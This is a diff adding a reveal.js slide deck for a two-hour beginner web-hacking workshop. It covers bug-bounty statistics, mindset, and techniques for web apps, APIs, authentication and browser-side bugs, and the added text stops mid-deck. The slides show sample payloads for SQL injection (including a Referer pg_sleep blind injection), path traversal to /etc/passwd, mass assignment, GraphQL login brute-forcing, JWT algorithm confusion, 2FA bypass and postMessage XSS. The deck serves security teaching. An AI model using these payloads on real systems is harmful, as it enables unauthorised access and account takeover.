@@ -1,0 +1,1734 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Let's Hack From The Beginning (2hr) — HackTheBay 3.0</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/dist/reset.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/dist/reveal.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/dist/theme/black.css" id="theme">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.5/plugin/highlight/monokai.css">
+
+  <style>
+    :root {
+      --r-heading-font: "JetBrains Mono", ui-monospace, monospace;
+      --r-main-font: "Inter", -apple-system, sans-serif;
+      --r-heading-text-transform: none;
+      --accent: #00ff9f;
+      --accent2: #ff0066;
+      --accent3: #ffcc00;
+      --dim: #6b7280;
+    }
+    .reveal h1, .reveal h2, .reveal h3 { letter-spacing: -0.02em; }
+    .reveal .accent { color: var(--accent); }
+    .reveal .accent2 { color: var(--accent2); }
+    .reveal .accent3 { color: var(--accent3); }
+    .reveal .dim { color: var(--dim); font-size: 0.8em; }
+    .reveal .small { font-size: 0.65em; }
+    .reveal .tiny { font-size: 0.5em; }
+    .reveal pre { width: 100%; box-shadow: 0 8px 32px rgba(0,255,159,0.1); }
+    .reveal pre code { max-height: 520px; padding: 20px; }
+    .reveal section img { border: none; box-shadow: none; }
+    .reveal .tag {
+      display: inline-block; padding: 2px 12px; border-radius: 4px;
+      background: rgba(0,255,159,0.15); border: 1px solid var(--accent);
+      font-size: 0.5em; font-family: var(--r-heading-font);
+      vertical-align: middle; margin-left: 8px;
+    }
+    .reveal .tag.owasp { background: rgba(255,0,102,0.15); border-color: var(--accent2); }
+    .reveal .tag.live { background: rgba(255,204,0,0.2); border-color: var(--accent3); color: var(--accent3); }
+    .reveal .cols { display: flex; gap: 40px; align-items: flex-start; }
+    .reveal .col { flex: 1; }
+    .reveal .box {
+      border: 1px solid #333; border-left: 3px solid var(--accent);
+      padding: 16px 24px; border-radius: 4px; background: rgba(255,255,255,0.03);
+      text-align: left; font-size: 0.7em;
+    }
+    .reveal .box.warn { border-left-color: var(--accent2); }
+    .reveal .box.story { border-left-color: var(--accent3); background: rgba(255,204,0,0.03); }
+    .reveal .grid10 {
+      display: grid; grid-template-columns: repeat(5, 1fr);
+      gap: 12px; font-size: 0.55em;
+    }
+    .reveal .grid10 > div {
+      border: 1px solid #333; padding: 16px 8px; border-radius: 6px;
+      background: rgba(255,255,255,0.02);
+    }
+    .reveal .grid10 > div:hover { border-color: var(--accent); }
+    .reveal blockquote {
+      border-left: 4px solid var(--accent); background: rgba(0,255,159,0.05);
+      font-style: normal; width: 90%;
+    }
+    .reveal table td, .reveal table th { font-size: 0.7em; }
+    .reveal .timeline {
+      font-size: 0.6em; text-align: left;
+      border-left: 2px solid var(--accent); padding-left: 24px;
+    }
+    .reveal .timeline > div { margin-bottom: 16px; position: relative; }
+    .reveal .timeline > div::before {
+      content: ""; position: absolute; left: -31px; top: 6px;
+      width: 12px; height: 12px; border-radius: 50%;
+      background: var(--accent);
+    }
+    .reveal .vs { display: flex; gap: 20px; align-items: stretch; }
+    .reveal .vs > div { flex: 1; padding: 16px; border-radius: 6px; font-size: 0.6em; }
+    .reveal .vs .bad { background: rgba(255,0,102,0.1); border: 1px solid var(--accent2); }
+    .reveal .vs .good { background: rgba(0,255,159,0.1); border: 1px solid var(--accent); }
+  </style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+<!-- ============================================================ -->
+<!-- TITLE                                                        -->
+<!-- ============================================================ -->
+<section data-background-gradient="linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%)">
+  <h1>Let's Hack<br><span class="accent">From The Beginning</span></h1>
+  <p class="dim">HackTheBay 3.0 · Extended Workshop · 2 hours</p>
+  <p style="margin-top:60px;">
+    <strong>Rotem Bar</strong><br>
+    <span class="dim small">Hacker · Security Researcher · Palo Alto Networks</span>
+  </p>
+  <aside class="notes">
+    2-hour version — we can breathe. More stories, more demos, more time to
+    actually break things together. Show of hands: who's here because they
+    tried to start hacking and bounced off? Good. Let's fix that.
+  </aside>
+</section>
+
+<section>
+  <h2>Why this talk exists</h2>
+  <blockquote>
+    "There are so many techniques, methods, focus areas…<br>
+    it's <span class="accent2">overwhelming</span> to begin."
+  </blockquote>
+  <p class="fragment small">
+    20 years ago I didn't know what a packet was.<br>
+    I just kept asking <span class="accent">"what happens if I don't?"</span>
+  </p>
+  <aside class="notes">
+    Personal bit. IDF tech unit → automotive → SaaS → Cider → Palo Alto.
+    Every transition felt like starting over. The MINDSET transferred.
+    The tools didn't. That's the point of today.
+  </aside>
+</section>
+
+<section>
+  <h2>The 2-Hour Deal</h2>
+  <div class="cols">
+    <div class="col box">
+      <strong class="accent">~70 min</strong> · Presentation<br><br>
+      10 attack surfaces<br>
+      2 tricks each<br>
+      War stories<br>
+      <span class="accent3">3 live demos</span>
+    </div>
+    <div class="col box">
+      <strong class="accent">~50 min</strong> · Workshop<br><br>
+      Hands-on labs<br>
+      Pick 2 areas<br>
+      Chain them together<br>
+      Show & tell at the end
+    </div>
+  </div>
+  <p class="dim small fragment">Everything: <code>github.com/rotemb/hackthebay-workshop</code></p>
+</section>
+
+<!-- ============================================================ -->
+<!-- DATA: WHAT ACTUALLY PAYS (from real H1 reports)             -->
+<!-- ============================================================ -->
+<section>
+  <section>
+    <h2>Before we start —<br>what <span class="accent">actually</span> works?</h2>
+    <p class="dim small">I pulled my last ~270 HackerOne reports. Here's the shape.</p>
+  </section>
+
+  <section>
+    <h3>Where the bugs were</h3>
+    <div class="cols">
+      <div class="col box small">
+        <strong class="accent">By count</strong><br><br>
+        XSS / DOM ........... <strong>77</strong><br>
+        API / IDOR .......... <strong>50</strong><br>
+        Injection ........... <strong>46</strong><br>
+        Auth bypass ......... <strong>41</strong><br>
+        Cloud / SSRF ........ <strong>35</strong><br>
+        Recon / exposed ..... <strong>20</strong><br>
+        CI/CD ............... <strong>8</strong><br>
+      </div>
+      <div class="col box small">
+        <strong class="accent2">By bounty (top techniques)</strong><br><br>
+        SSRF → AWS creds ..... <strong>10.0</strong><br>
+        Request smuggling .... <strong>9.8</strong><br>
+        Exposed config.json .. <strong>9.3</strong><br>
+        .npmrc RCE ........... <strong>8.9</strong><br>
+        SQLi via Referer ..... <strong>8.5</strong><br>
+        XSS+CORS chain ....... <strong>8.3</strong><br>
+      </div>
+    </div>
+    <aside class="notes">
+      Notice: most COMMON ≠ highest PAID. XSS is everywhere but pays medium.
+      SSRF is rarer but when it hits metadata it's a 10.
+    </aside>
+  </section>
+
+  <section>
+    <h3>The patterns that kept repeating</h3>
+    <table class="small">
+      <tr><th>Found it</th><th>The thing</th></tr>
+      <tr><td><strong class="accent">15+ times</strong></td><td>Same vulnerable plugin code across unrelated targets</td></tr>
+      <tr><td><strong class="accent">10+ times</strong></td><td>Export/report endpoint — auth'd but no ownership check</td></tr>
+      <tr><td><strong class="accent">8+ times</strong></td><td>SSRF via <code>Referer</code> header (nobody filters headers)</td></tr>
+      <tr><td><strong class="accent">6+ times</strong></td><td><code>/actuator/prometheus</code> exposed — leaks every endpoint</td></tr>
+      <tr><td><strong class="accent">5+ times</strong></td><td>Phone/email swap during multi-step signup</td></tr>
+      <tr><td><strong class="accent">5+ times</strong></td><td><code>?debug=true</code> still works in prod</td></tr>
+    </table>
+    <p class="tiny dim fragment">These aren't clever. They're <span class="accent">boring and everywhere</span>. That's the point.</p>
+  </section>
+
+  <section>
+    <h3>The uncomfortable truth</h3>
+    <blockquote>
+      Highest-bounty bugs were <span class="accent2">not</span> 0-days.<br><br>
+      They were <span class="accent">basic mistakes at scale</span><br>
+      or <span class="accent">3 boring bugs chained into 1 critical.</span>
+    </blockquote>
+    <p class="small dim fragment">
+      XSS alone = 5.0<br>
+      XSS + wildcard CORS + cookie scope = <strong class="accent2">8.3</strong> account takeover
+    </p>
+    <aside class="notes">
+      This is the most important slide in the deck. Beginners think they need
+      to find novel bug classes. No. Find the boring thing nobody else
+      bothered to check. Then find two more. Chain them.
+    </aside>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- MINDSET (EXTENDED)                                           -->
+<!-- ============================================================ -->
+<section data-background-color="#0d1b2a">
+  <section>
+    <h1><span class="accent">#0</span><br>The Mindset</h1>
+    <p class="dim">the part that actually matters</p>
+  </section>
+
+  <section>
+    <h2>You are not a "pentester"</h2>
+    <h2 class="fragment">You are a <span class="accent">very confused user</span></h2>
+    <p class="fragment small">
+      The app expects you to click "Submit".<br>
+      You're asking: <em>what if I don't?</em>
+    </p>
+  </section>
+
+  <section>
+    <h2>Three questions. Always.</h2>
+    <ol>
+      <li class="fragment">Where does <span class="accent">my data</span> go?</li>
+      <li class="fragment">What does the server <span class="accent">trust</span> that it shouldn't?</li>
+      <li class="fragment">What happens if I <span class="accent">lie</span>?</li>
+    </ol>
+    <p class="fragment dim tiny">Every OWASP category is just a specific answer to one of these.</p>
+  </section>
+
+  <section>
+    <h3>Let's prove it</h3>
+    <table class="small">
+      <tr><th>OWASP</th><th>Which question?</th></tr>
+      <tr class="fragment"><td>SQL Injection</td><td><span class="accent">#3</span> — I lied in a text field</td></tr>
+      <tr class="fragment"><td>IDOR / BOLA</td><td><span class="accent">#2</span> — server trusts the ID I sent</td></tr>
+      <tr class="fragment"><td>SSRF</td><td><span class="accent">#1</span> — my URL goes to the cloud metadata</td></tr>
+      <tr class="fragment"><td>XSS</td><td><span class="accent">#1+#3</span> — my data goes to someone's DOM</td></tr>
+      <tr class="fragment"><td>Broken Auth</td><td><span class="accent">#2</span> — server trusts my forged token</td></tr>
+    </table>
+    <aside class="notes">
+      Audience participation — throw out a bug class, I'll map it.
+      Point: you don't need to memorize 50 attack types. You need 3 questions.
+    </aside>
+  </section>
+
+  <section>
+    <h2>The Rabbit Hole Rule</h2>
+    <div class="box">
+      If something looks weird, you have <strong class="accent">15 minutes</strong> to chase it.<br><br>
+      After 15 min: write it down, move on, come back later.<br><br>
+      <span class="dim">90% of my best bugs came from the "come back later" list.</span>
+    </div>
+  </section>
+
+  <section>
+    <h3>My actual list system</h3>
+    <div class="box story small">
+      <strong class="accent3">weird.md</strong> — one file, append-only<br><br>
+      <code>2026-01-14 · target.com · /api/export takes a `template` param that looks like a file path. 403'd on ../. Try encoding?</code><br><br>
+      <code>2026-01-14 · target.com · JWT has a `scope` claim I've never seen. What reads it?</code><br><br>
+      <code>2026-01-19 · target.com · came back to template param. Double URL encoding → 200. LFI. 🎉</code>
+    </div>
+    <p class="tiny dim fragment">Boring? Yes. This file has made me more money than any tool.</p>
+    <aside class="notes">
+      Show of hands — who has a system like this? Almost nobody. Everyone
+      relies on memory. Memory is terrible. The template param → LFI thing
+      here is a real entry. I ignored it for 5 days. Came back because I
+      was procrastinating on something else. Double URL encoding. Done.
+
+      The file doesn't need to be fancy. It needs to EXIST.
+    </aside>
+  </section>
+
+  <section>
+    <h2>Dev brain vs Hacker brain</h2>
+    <div class="vs">
+      <div class="bad">
+        <strong>Developer sees:</strong><br><br>
+        <code>if (user.role === 'admin')</code><br><br>
+        "Only admins can do this. ✅ Done."
+      </div>
+      <div class="good">
+        <strong>Hacker sees:</strong><br><br>
+        <code>if (user.role === 'admin')</code><br><br>
+        "Where does <code>user.role</code> get <em>set</em>? Can I set it? What if it's <code>['admin']</code>? What if it's <code>'Admin'</code>? What if the user object is <code>null</code>?"
+      </div>
+    </div>
+    <aside class="notes">
+      Same line of code. Totally different reading. This is the whole game.
+    </aside>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- THE 10 AREAS OVERVIEW                                        -->
+<!-- ============================================================ -->
+<section>
+  <h2>10 Playgrounds</h2>
+  <div class="grid10">
+    <div><strong class="accent">01</strong><br>Web Apps</div>
+    <div><strong class="accent">02</strong><br>APIs</div>
+    <div><strong class="accent">03</strong><br>Auth & Sessions</div>
+    <div><strong class="accent">04</strong><br>Browser / Client-Side</div>
+    <div><strong class="accent">05</strong><br>Mobile</div>
+    <div><strong class="accent">06</strong><br>Cloud</div>
+    <div><strong class="accent">07</strong><br>CI/CD & Supply Chain</div>
+    <div><strong class="accent">08</strong><br>IoT / Firmware</div>
+    <div><strong class="accent">09</strong><br>Source Code</div>
+    <div><strong class="accent">10</strong><br>Recon</div>
+  </div>
+  <p class="dim tiny">Each: start → trick #1 → trick #2 → war story → go deeper</p>
+</section>
+
+<!-- ============================================================ -->
+<!-- 01 — WEB APPS (EXTENDED)                                     -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">01</span> Web Apps</h1>
+    <p><span class="tag owasp">A03 Injection</span> <span class="tag owasp">A01 Broken Access Control</span></p>
+  </section>
+
+  <section>
+    <h3>How to start</h3>
+    <div class="box">
+      <ol>
+        <li>Open DevTools → <strong>Network tab</strong> → filter <code>XHR/Fetch</code></li>
+        <li>Click <em>every</em> button. Watch what fires.</li>
+        <li>Find the request with the most parameters. <span class="accent">That's your target.</span></li>
+      </ol>
+    </div>
+    <p class="small dim fragment">No Burp yet. No scanner. Just you and F12.</p>
+  </section>
+
+  <section>
+    <h3>Why F12 before Burp?</h3>
+    <div class="vs">
+      <div class="bad">
+        <strong>Burp-first beginners:</strong><br><br>
+        See 400 requests.<br>
+        Spray <code>'</code> into everything.<br>
+        Get blocked by WAF.<br>
+        Conclude the app is "secure."<br>
+        Leave.
+      </div>
+      <div class="good">
+        <strong>F12-first beginners:</strong><br><br>
+        See 12 requests that matter.<br>
+        Understand what each does.<br>
+        Notice one returns <em>other users' data</em>.<br>
+        Don't even need a payload.<br>
+        $$$.
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h3>Trick #1 — Change one thing</h3>
+    <pre><code class="http" data-trim data-line-numbers="5">
+POST /api/export HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"format": "pdf", "report_id": 1337}
+    </code></pre>
+    <div class="fragment">
+      <pre><code class="json" data-trim data-line-numbers="1|2|3|4|5|6">
+{"format": "pdf", "report_id": 1338}              ← IDOR
+{"format": "pdf", "report_id": [1337, 1338]}      ← type confusion
+{"format": "pdf", "report_id": {"$gt": 0}}        ← NoSQL
+{"format": "pdf", "report_id": "1337' OR '1'='1"} ← SQLi
+{"format": "../../etc/passwd", "report_id": 1337} ← path traversal
+{"format": "pdf", "report_id": 1337, "user_id": 1}← param pollution
+      </code></pre>
+    </div>
+  </section>
+
+  <section>
+    <h3>Trick #2 — HTTP method swap</h3>
+    <pre><code class="http" data-trim data-line-numbers="1|1">
+GET /api/users/5/settings HTTP/1.1     ← works, shows my settings
+    </code></pre>
+    <div class="fragment">
+    <pre><code class="http" data-trim data-line-numbers="1|2|3|4|5">
+POST   /api/users/5/settings   ← 405? or does it create something?
+PUT    /api/users/5/settings   ← update with no body?
+DELETE /api/users/5/settings   ← 😬
+PATCH  /api/users/5/settings   ← partial update, often no authz check
+HEAD   /api/users/5/settings   ← sometimes bypasses auth middleware entirely
+    </code></pre>
+    <p class="tiny dim">Frameworks route by path first, check method second. Authz often only guards GET.</p>
+    </div>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — the header nobody checks</h3>
+    <div class="box story">
+      <strong>Blind SQLi. Via the <code>Referer</code> header.</strong> Paid 8.5.<br><br>
+      Every body param, every query string — WAF blocked <code>'</code> instantly.<br>
+      Referer header? Logged straight into an analytics table. Raw.<br><br>
+      <code class="accent3">Referer: https://x.com/'||(SELECT CASE WHEN(1=1) THEN pg_sleep(5) END)||'</code><br><br>
+      <span class="dim">5-second delay. Confirmed. The WAF was watching the front door. I walked in through the HVAC.</span>
+    </div>
+    <aside class="notes">
+      Found this pattern 8+ times across different programs. Referer, User-Agent,
+      X-Forwarded-For — anything that gets logged probably gets stored. And
+      "stored" often means "INSERT INTO". WAFs don't inspect these by default.
+    </aside>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — the export that exported everyone</h3>
+    <div class="box story">
+      <strong>Found this shape 10+ times. Different companies. Same bug.</strong><br><br>
+      <code>POST /api/reports/export</code> with <code>{"customer_id": 1337}</code><br><br>
+      Auth check? ✅ Valid JWT required.<br>
+      Ownership check? <span class="accent3">❌ Never asked if 1337 was mine.</span><br><br>
+      <span class="dim">"Export" features get added late, by a different dev, as a convenience. They copy the auth middleware. They forget the authz check. Every. Time.</span>
+    </div>
+    <aside class="notes">
+      This is THE most repeatable bug in my dataset. When you see "Export",
+      "Download report", "Generate PDF" — your pulse should quicken.
+      Change the ID. It works more often than it doesn't.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Practice</strong></td><td>PortSwigger Web Security Academy — do all of Access Control first</td></tr>
+      <tr><td><strong>Tool</strong></td><td>Burp Community / Caido — <em>after</em> you understand the app</td></tr>
+      <tr><td><strong>Extension</strong></td><td>Autorize (Burp) — automates "can user A do user B's thing?"</td></tr>
+      <tr><td><strong>Habit</strong></td><td>Append <code>.json</code>, <code>.xml</code>, <code>/</code>, <code>%20</code> to every path</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 02 — APIs (EXTENDED)                                         -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">02</span> APIs</h1>
+    <p><span class="tag owasp">API1 BOLA</span> <span class="tag owasp">API3 Property Auth</span> <span class="tag">GraphQL</span></p>
+  </section>
+
+  <section>
+    <h3>How to start</h3>
+    <div class="box">
+      APIs are just web apps <span class="accent">without the UI lying to you.</span><br><br>
+      Find the spec:
+      <ul class="small">
+        <li><code>/swagger.json</code> · <code>/openapi.json</code> · <code>/v2/api-docs</code> · <code>/api/docs</code></li>
+        <li><code>/graphql</code> → send introspection query</li>
+        <li>No spec? → mobile app traffic, JS bundle, or just… guess verbs</li>
+      </ul>
+    </div>
+  </section>
+
+  <section>
+    <h3>Trick #1 — Mass Assignment</h3>
+    <pre><code class="http" data-trim data-line-numbers="1-7|6">
+PUT /api/users/me HTTP/1.1
+Content-Type: application/json
+
+{
+  "display_name": "rotem",
+  "role": "admin"
+}
+    </code></pre>
+    <p class="small">The frontend never sends <code>role</code>. The ORM binds everything anyway.</p>
+  </section>
+
+  <section>
+    <h3>The mirror attack — step by step</h3>
+    <pre><code class="bash" data-trim data-line-numbers="1-5|7-9|11-15">
+# Step 1: What does the server KNOW about me?
+GET /api/users/me
+→ {"id":5, "email":"me@x.com", "name":"rotem",
+   "role":"user", "is_verified":false,
+   "org_id":12, "credit_balance":0, "is_beta":false}
+
+# Step 2: What does the UI let me SET?
+# (only "name" — that's the only field in the settings form)
+
+# Step 3: Send EVERYTHING back. See what sticks.
+PUT /api/users/me
+{"name":"rotem", "role":"admin", "is_verified":true,
+ "org_id":1, "credit_balance":999999, "is_beta":true}
+
+# One of these will work. Maybe three.
+    </code></pre>
+  </section>
+
+  <section>
+    <h3>Trick #2 — GraphQL alias batching</h3>
+    <p class="small">Rate limit says 5 login attempts per minute? Cool.</p>
+    <pre><code class="graphql" data-trim data-line-numbers="1-7|1,2,3,4,5,6">
+mutation {
+  a1: login(user:"admin", pass:"password1") { token }
+  a2: login(user:"admin", pass:"password2") { token }
+  a3: login(user:"admin", pass:"123456")    { token }
+  a4: login(user:"admin", pass:"admin")     { token }
+  ...1000 more aliases...
+}
+    </code></pre>
+    <p class="small fragment">
+      <span class="accent">One HTTP request.</span> One rate-limit hit. 1000 password guesses.<br>
+      <span class="dim tiny">Most GraphQL servers don't limit query complexity or alias count.</span>
+    </p>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story</h3>
+    <div class="box story">
+      <strong>SaaS platform. GraphQL API. Introspection disabled</strong> (good!).<br><br>
+      But: error messages were <em>verbose</em>.<br><br>
+      <code>query { user { xyz } }</code><br>
+      → <code class="accent3">"Cannot query field 'xyz' on type 'User'. Did you mean 'xxxSecretField'?"</code><br><br>
+      <span class="dim">I bruteforced the entire schema via typo suggestions. 40 minutes. Found an <code>internalNotes</code> field on every customer record.</span>
+    </div>
+    <aside class="notes">
+      Apollo Server's "Did you mean?" feature. Helpful for devs.
+      Devastating for hiding your schema. Now there's a tool for this: clairvoyance.
+    </aside>
+  </section>
+
+  <section>
+    <h3 class="accent3">Bonus — <code>/metrics</code> is a free API spec</h3>
+    <div class="box story">
+      <strong>Found 6+ times. Spring Boot apps. Always the same.</strong><br><br>
+      <code>GET /actuator/prometheus</code> → 200 OK, no auth<br><br>
+      <pre class="tiny"><code>http_server_requests_seconds_count{method="POST",
+  uri="/api/internal/admin/users/{id}/impersonate", status="200"} 47</code></pre><br>
+      <span class="dim">Every endpoint. Every method. Every path parameter. How often it's called. Which ones return 500. It's a Swagger spec that writes itself.</span>
+    </div>
+    <aside class="notes">
+      Low severity on its own (3.7). But it's the best recon you'll ever get.
+      I've found admin impersonation endpoints, internal debug routes, and
+      unreleased API versions — all from a metrics page nobody thought to lock.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Read</strong></td><td>OWASP API Security Top 10 — different list than web!</td></tr>
+      <tr><td><strong>Practice</strong></td><td>crAPI, vAPI, DVGA (Damn Vulnerable GraphQL App)</td></tr>
+      <tr><td><strong>Tool</strong></td><td><code>clairvoyance</code> — schema recon via error messages</td></tr>
+      <tr><td><strong>Tool</strong></td><td><code>graphql-cop</code> — automated GraphQL misconfig checks</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 03 — AUTH (EXTENDED)                                         -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">03</span> Auth & Sessions</h1>
+    <p><span class="tag owasp">A07 Ident & Auth Failures</span> <span class="tag owasp">A02 Crypto Failures</span></p>
+  </section>
+
+  <section>
+    <h3>How to start</h3>
+    <div class="box">
+      Decode <strong>every</strong> token you see. Before anything else.<br><br>
+      <code class="small">echo "eyJhbG..." | cut -d. -f1,2 | tr '.' '\n' | base64 -d</code><br><br>
+      <span class="dim tiny">Pro tip: <code>eyJ</code> at the start = base64 of <code>{"</code> = it's JSON</span>
+    </div>
+  </section>
+
+  <section>
+    <h3>What am I looking at?</h3>
+    <table class="small">
+      <tr><th>Starts with</th><th>Probably</th><th>Do this</th></tr>
+      <tr><td><code>eyJ</code></td><td>JWT</td><td>jwt.io → check <code>alg</code></td></tr>
+      <tr><td><code>s%3A</code></td><td>Signed Express cookie</td><td>URL-decode, check signature secret</td></tr>
+      <tr><td><code>.eJ</code></td><td>Flask session</td><td><code>flask-unsign --decode</code></td></tr>
+      <tr><td><code>gAAAAA</code></td><td>Fernet (Python)</td><td>Need the key — check for leaks</td></tr>
+      <tr><td>random hex</td><td>Opaque session ID</td><td>Check entropy, try sequential</td></tr>
+      <tr><td>ends <code>==</code></td><td>base64 something</td><td>Decode, then start over</td></tr>
+    </table>
+  </section>
+
+  <section>
+    <h3>Trick #1 — JWT algorithm confusion</h3>
+    <pre><code class="json" data-trim data-line-numbers="2|2">
+// Original — asymmetric, can't forge without private key
+{"alg": "RS256", "typ": "JWT"}
+{"sub": "user_123", "role": "user"}
+    </code></pre>
+    <div class="fragment">
+    <pre><code class="json" data-trim data-line-numbers="2,4">
+// Forged — symmetric, sign with their PUBLIC key as the HMAC secret
+{"alg": "HS256", "typ": "JWT"}
+{"sub": "user_123", "role": "admin"}
+    </code></pre>
+    <p class="tiny dim">Library: "HS256? I'll verify with the key you gave me." Key = public RSA key. Verification passes.</p>
+    </div>
+  </section>
+
+  <section>
+    <h3>Trick #2 — The password reset race</h3>
+    <div class="timeline">
+      <div><strong>T+0:</strong> Request password reset for <code>victim@target.com</code></div>
+      <div class="fragment"><strong>T+0.001s:</strong> Request password reset for <code>attacker@evil.com</code></div>
+      <div class="fragment"><strong>Server:</strong> generates token based on <code>timestamp + user_id</code>… but both requests hit in the same millisecond</div>
+      <div class="fragment"><strong>Result:</strong> both emails get the <span class="accent2">same token</span>. Or sequential tokens. Or I can predict victim's from mine.</div>
+    </div>
+    <p class="tiny dim fragment">Send 20 parallel requests with Turbo Intruder. Check your inbox. Check if the tokens rhyme.</p>
+  </section>
+
+  <section>
+    <h3>The 2FA bypass speedrun</h3>
+    <pre><code class="text" data-trim data-line-numbers="1-2|4-5|7-8|10-11|13-14">
+POST /verify-otp  {"otp": "123456"}  → 401
+Can I just... not?
+
+POST /verify-otp  {}                  → what happens?
+POST /verify-otp  {"otp": null}       → what happens?
+
+POST /verify-otp  {"otp": "000000"}   → some use static test codes
+POST /verify-otp  {"otp": true}       → type coercion in PHP/JS
+
+GET  /dashboard                        → is 2FA only checked on /verify?
+POST /api/v1/verify-otp  (v2 has 2FA, does v1?)
+
+Response manipulation:
+{"success": false}  →  intercept  →  {"success": true}  →  does client trust it?
+    </code></pre>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — the field swap</h3>
+    <div class="box story">
+      <strong>Multi-step signup. Found this shape 5+ times.</strong><br><br>
+      <span class="dim">Step 1:</span> Enter email + phone → OTP sent to phone<br>
+      <span class="dim">Step 2:</span> Enter OTP → verified ✅<br>
+      <span class="dim">Step 3:</span> Set password → account created<br><br>
+      <span class="accent3">Between step 2 and step 3, I changed the email field to victim@target.com.</span><br><br>
+      Server: "phone verified = user verified." Never re-checked the email.<br>
+      I now own victim's account. My phone. Their email.<br><br>
+      <span class="dim">Multi-step flows trust that earlier steps stay true. They don't.</span>
+    </div>
+    <aside class="notes">
+      The mental model: state machines with no state. Each API call validates
+      itself — nobody validates the SEQUENCE. Variant I've also hit: password
+      reset where step 1 sends token, step 3 sets password, and step 2
+      (verify token) can just be... skipped. Call 1 then 3. Works.
+
+      Ask the room: who's built a signup flow? Did you re-validate the email
+      at the END? Almost nobody does. The bug is in the assumption, not the code.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Tool</strong></td><td><code>jwt_tool</code> — <code>-M at</code> runs all attacks automatically</td></tr>
+      <tr><td><strong>Tool</strong></td><td><code>flask-unsign</code> — crack Flask session secrets with wordlist</td></tr>
+      <tr><td><strong>Read</strong></td><td>OAuth 2.0 Threat Model (RFC 6819) — dense but gold</td></tr>
+      <tr><td><strong>Lab</strong></td><td>PortSwigger: entire JWT + OAuth + Auth sections</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 04 — BROWSER (EXTENDED + LIVE DEMO)                          -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">04</span> Browser & Client-Side</h1>
+    <p><span class="tag owasp">A03 XSS</span> <span class="tag">postMessage</span> <span class="tag">Prototype Pollution</span> <span class="tag live">LIVE DEMO</span></p>
+  </section>
+
+  <section>
+    <h3>How to start</h3>
+    <div class="box">
+      <pre><code class="javascript" data-trim>
+// Paste in console on ANY page. Then use the site.
+window.addEventListener('message',
+  e => console.warn('[MSG]', e.origin, '→', e.data), true);
+      </code></pre>
+      Modern apps = 10 iframes yelling at each other.<br>
+      <span class="accent">Almost nobody validates origin correctly.</span>
+    </div>
+  </section>
+
+  <section>
+    <h3>Trick #1 — postMessage origin bypass</h3>
+    <pre><code class="javascript" data-trim data-line-numbers="3">
+window.addEventListener('message', (e) => {
+  if (e.origin.includes('trusted.com')) {   // ← the bug
+    document.body.innerHTML = e.data.html;  // ← the sink
+  }
+});
+    </code></pre>
+    <div class="fragment">
+      <p class="small">Domains that pass <code>.includes('trusted.com')</code>:</p>
+      <pre><code class="text" data-trim>
+trusted.com.evil.net      ✅ passes
+evil-trusted.com          ✅ passes
+eviltrusted.com           ✅ passes
+evil.net/?x=trusted.com   ❌ (origin doesn't include path)
+      </code></pre>
+    </div>
+  </section>
+
+  <section data-background-color="#2a1a00">
+    <h2><span class="accent3">⚡ LIVE DEMO</span></h2>
+    <p class="small">
+      postMessage → DOM XSS on a staged target<br><br>
+      <span class="dim">Watch for: the listener, the broken check, the sink, the pop</span>
+    </p>
+    <div class="box warn small">
+      <strong>Demo target:</strong> <code>assets/demo-postmessage/vulnerable.html</code> (runs on :9000)<br><br>
+      1. Show the "support portal" — logged-in admin, session cookie visible in console<br>
+      2. Sources → <code>vulnerable.html</code> line ~50 → the listener<br>
+      3. Point at <code>.includes('acmecorp')</code> — substring match, the bug<br>
+      4. Point at <code>innerHTML +=</code> — the sink<br>
+      5. Paste payload from <code>attacker.html</code> → chat log turns red → cookie printed<br>
+      6. "Two normal-looking lines. Full session theft."<br><br>
+      <span class="dim">Full 4-min script: <code>assets/demo-postmessage/README.md</code></span>
+    </div>
+    <aside class="notes">
+      Target is fully local — no wifi dependency. Practice the payload paste
+      twice, the &lt;img onerror&gt; has quote-escaping that's easy to fumble live.
+      Fallback if it breaks: just walk through the code in Sources. The bug
+      is visible without the pop.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Trick #2 — Prototype pollution</h3>
+    <p class="small">The bug class nobody understands (including most devs)</p>
+    <pre><code class="javascript" data-trim data-line-numbers="1-4|6-9|11-13">
+// Vulnerable: recursive merge (lodash <4.17.12, jQuery $.extend deep, ...)
+function merge(target, source) {
+  for (let key in source) { target[key] = source[key]; }
+}
+
+// Attacker controls source (query string, JSON body, whatever):
+merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
+// Now EVERY object in the app has .isAdmin === true
+// (unless it was explicitly set to something else)
+
+// Somewhere else in the code, much later:
+if (user.isAdmin) { ... }   // user.isAdmin was never set
+// → falls through to Object.prototype.isAdmin → true → 🎉
+    </code></pre>
+  </section>
+
